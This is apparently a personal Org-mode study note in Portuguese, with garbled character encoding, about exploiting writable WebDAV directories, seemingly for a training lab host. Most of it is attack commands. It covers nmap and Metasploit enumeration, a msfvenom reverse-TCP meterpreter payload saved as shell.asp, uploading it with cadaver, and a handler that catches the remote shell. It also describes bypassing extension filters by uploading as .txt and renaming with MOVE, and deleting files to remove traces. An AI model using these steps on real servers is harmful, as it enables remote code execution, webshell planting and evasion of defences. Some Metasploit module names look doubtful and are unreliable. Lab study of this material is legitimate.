#+TITLE: ğŸ’€ ExploraÃ§Ã£o WebDAV com Metasploit
#+AUTHOR: Gabriel
#+OPTIONS: toc:2

* ğŸ” Fase 1: EnumeraÃ§Ã£o e VerificaÃ§Ã£o
Antes de atacar, precisamos confirmar se os mÃ©todos do WebDAV estÃ£o ativos, especialmente o mÃ©todo ~PUT~.

** ğŸ›°ï¸ VerificaÃ§Ã£o com Nmap
O script ~http-enum~ Ã© excelente para identificar diretÃ³rios WebDAV.
#+begin_src sh
nmap -Pn -p80 --script http-enum,http-methods --script-args http-methods.url-path='/webdav/' <TARGET_IP>
#+end_src

** ğŸ§ª Teste de Vulnerabilidade no MSF
Podemos usar um mÃ³dulo auxiliar para confirmar se o diretÃ³rio Ã© "escrevÃ­vel".
#+begin_src msf
use auxiliary/scanner/http/webdav_scanner
set RHOSTS <TARGET_IP>
set TARGETURI /webdav/
run
#+end_src

* ğŸš€ Fase 2: ExploraÃ§Ã£o (WebDAV Upload)
Se o scanner confirmou que o diretÃ³rio permite escrita, vamos usar o mÃ³dulo ~webdav_upload_asp~ (ou PHP, dependendo do servidor).



** ğŸ› ï¸ ConfiguraÃ§Ã£o do Exploit
Neste exemplo, assumimos um servidor IIS (Windows) que aceita arquivos ~.asp~ ou ~.aspx~.
#+begin_src msf
use exploit/windows/http/asp_net_upload_main
# OU o mÃ³dulo genÃ©rico de upload:
use exploit/multi/http/remotely_anywhere_http_upload

# ConfiguraÃ§Ãµes comuns:
set RHOSTS <TARGET_IP>
set TARGETURI /webdav/
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <SEU_IP>
exploit
#+end_src

* ğŸ“‚ Fase 3: MÃ©todo Manual (Cadaver + MSFVenom)
Ã€s vezes o exploit automÃ¡tico falha. Podemos gerar o payload manualmente e subir via cliente WebDAV.

** 1. Gerar o Payload
#+begin_src sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<SEU_IP> LPORT=4444 -f asp > shell.asp
#+end_src

** 2. Fazer o Upload com 'Cadaver'
#+begin_src sh
cadaver http://<TARGET_IP>/webdav/
# No prompt do cadaver:
put shell.asp
exit
#+end_src

** 3. Receber a ConexÃ£o (Handler)
#+begin_src msf
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <SEU_IP>
run
#+end_src
#+ğŸ’¡ Dica: ApÃ³s o run, acesse http://<TARGET_IP>/webdav/shell.asp no navegador para triggar a execuÃ§Ã£o.

* ğŸ“ Notas de Post-Exploitation
- **ExtensÃµes Proibidas**: Se ~.asp~ for bloqueado, tente renomear para ~.txt~, fazer o upload e usar o comando ~MOVE~ do WebDAV para renomear de volta para ~.asp~.
- **PermissÃµes**: O usuÃ¡rio do WebDAV (geralmente ~IUSR~ ou ~www-data~) costuma ter poucos privilÃ©gios. O prÃ³ximo passo apÃ³s o shell Ã© a **Privilege Escalation**.

* ğŸ› ï¸ Tool: Davtest (EnumeraÃ§Ã£o de Vulnerabilidades)
O ~davtest~ automatiza o processo de testar quais extensÃµes de arquivo o servidor permite o upload e, mais importante, quais ele consegue executar.

** ğŸ’» Comandos PrÃ¡ticos
#+begin_src sh
# Teste bÃ¡sico de permissÃµes e execuÃ§Ã£o
davtest -url http://demo1.ine.local/webdav/

# Teste enviando arquivos de texto customizados
davtest -url http://demo1.ine.local/webdav/ -send_txt

# Teste com autenticaÃ§Ã£o (caso o diretÃ³rio peÃ§a usuÃ¡rio/senha)
davtest -url http://demo1.ine.local/webdav/ -auth user:password
#+end_src

** ğŸ“‹ O que observar no Output:
- **Sending test file**: O davtest tenta subir arquivos como .php, .asp, .pl.
- **Executes**: Se aparecer "Succeed" na coluna de execuÃ§Ã£o, vocÃª jÃ¡ sabe exatamente qual payload gerar no MSFVenom.

---

* ğŸ“‚ Tool: Cadaver (ManipulaÃ§Ã£o de Arquivos)
O ~cadaver~ Ã© um cliente WebDAV em linha de comando que se comporta como um cliente FTP clÃ¡ssico. Ele Ã© essencial para quando vocÃª precisa de controle manual sobre o alvo.

** ğŸ•¹ï¸ Comandos PrÃ¡ticos
#+begin_src sh
# Conectar ao servidor alvo
cadaver http://demo1.ine.local/webdav/

# --- Comandos dentro do shell do Cadaver ---
dav:/webdav/> put /home/gabriel/shell.php    # Sobe o seu payload
dav:/webdav/> ls                             # Lista arquivos no diretÃ³rio
dav:/webdav/> move shell.php bypass.php      # Renomeia arquivos (Ãºtil para bypass)
dav:/webdav/> delete shell.php               # Remove vestÃ­gios apÃ³s a invasÃ£o
dav:/webdav/> exit                           # Encerra a conexÃ£o
#+end_src

** ğŸ’¡ Dica de Ouro:
Se o servidor bloquear o upload direto de extensÃµes executÃ¡veis, tente subir um arquivo de texto e usar o comando ~move~ dentro do cadaver para trocar a extensÃ£o no servidor. Muitas vezes, a polÃ­tica de seguranÃ§a sÃ³ checa o comando ~PUT~.
